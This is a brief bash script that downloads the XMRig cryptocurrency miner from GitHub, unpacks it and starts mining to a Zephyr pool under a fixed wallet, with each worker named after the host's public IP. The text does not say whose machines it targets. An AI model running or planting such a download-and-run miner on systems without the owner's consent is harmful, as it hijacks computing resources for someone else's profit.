#!/bin/bash

# Fetch IP and format it
WORKER_ID=$(curl -s ifconfig.me | tr '.' '_')

# Run the download, extraction, and miner in one sequence
wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-jammy-x64.tar.gz && tar -xf xmrig-6.25.0-jammy-x64.tar.gz && cd xmrig-6.25.0 && clear && ./xmrig -o us.zephyr.herominers.com:1123 -u ZEPHsBn6ofeKyCScDbJsBsfYRvq92zgtwD9kH1Fq4pv5TbcgiWuK9xgBVrCzeLGifZ9y9WQ3gJDwmJq2PBcUcv9CK927kasQ7d8.$WORKER_ID -p x --tls -k -a rx/0
